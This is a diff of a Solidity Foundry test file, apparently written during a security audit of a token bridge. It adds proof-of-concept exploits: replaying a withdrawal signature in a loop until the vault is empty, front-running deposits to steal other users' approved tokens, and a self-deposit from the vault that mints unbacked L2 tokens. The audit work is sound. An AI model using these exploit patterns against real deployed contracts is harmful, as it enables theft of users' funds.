@@ -251,15 +251,14 @@ contract L1BossBridgeTest is Test {
         //operator is signing the message
         (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(user, depositAmount), operator.key);
         //using the signature to withdraw the tokens
-        tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
-
-        //replaying the signature to withdraw the tokens again
-        tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
-
+        //replaying the signature to withdraw the tokens again and again
+        while(token.balanceOf(address(vault)) >= depositAmount){
+            tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
+        }
         //user now owns double of the deposit amount
-        assertEq(token.balanceOf(address(user)), userInitialBalance + depositAmount);
+        assertGt(token.balanceOf(address(user)), userInitialBalance);
         //valut has lost an extra of depositAmount in the exploit
-        assertEq(token.balanceOf(address(vault)), amountToDeposit - depositAmount);
+        assertEq(token.balanceOf(address(vault)), 0);
     }
 
     //@audit-poc
@@ -282,15 +281,16 @@ contract L1BossBridgeTest is Test {
     }
 
     //@audit-poc
-    function test_depositTokensToL2_called_by_random_address() external {
+    function test_depositTokensToL2_called_by_random_address_causing_MEV() external {
         uint256 amountToDeposit = 100e18;
         vm.prank(newUser);
         token.approve(address(tokenBridge), amountToDeposit);
 
         assertEq(token.balanceOf(newUser), amountToDeposit);
-        //attacker has initiated the deposit for a user
+
+        //attacker has initiated the deposit for a user and replaced the recipient address with his own address
         vm.prank(user);
-        tokenBridge.depositTokensToL2(newUser, newUserL2, amountToDeposit);
+        tokenBridge.depositTokensToL2(newUser, userInL2, amountToDeposit);
 
         assertEq(token.balanceOf(address(vault)), amountToDeposit);
         assertEq(token.balanceOf(newUser), 0);
@@ -303,5 +303,38 @@ contract L1BossBridgeTest is Test {
 
         assertEq(token.balanceOf(address(vault)), 0);
         assertEq(token.balanceOf(user), userInitialBalance + amountToDeposit);
+    }
+
+    //@audit-poc
+    function testCanMoveApprovedTokensOfOtherUsers_MEV() external {
+        vm.prank(user);
+        token.approve(address(tokenBridge), type(uint256).max);
+
+        //Bob front-runs the transaction and replaces the alice's L2 recipient address with his own
+        address attacker = makeAddr("attacker");
+        uint256 amountToDeposit = token.balanceOf(user);
+
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(user, attacker, amountToDeposit);
+
+        vm.prank(attacker);
+        tokenBridge.depositTokensToL2(user, attacker, amountToDeposit);
+
+        assertEq(token.balanceOf(user), 0);
+        assertEq(token.balanceOf(address(vault)), amountToDeposit);
+    }
+
+    //@audit-poc 
+    function testCanTransferFromVaultToVault() external {
+        address attacker = makeAddr('attacker');
+        
+        uint256 vaultBalance = 500 ether;
+        deal(address(token), address(vault), vaultBalance);
+        vm.expectEmit(address(tokenBridge));
+        vm.prank(attacker);
+        //Self transferring tokens from vault to vault
+        emit Deposit(address(vault), attacker, vaultBalance);
+        //@note can do this forever, mint infinite tokens on the L2
+        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);
     }
 }
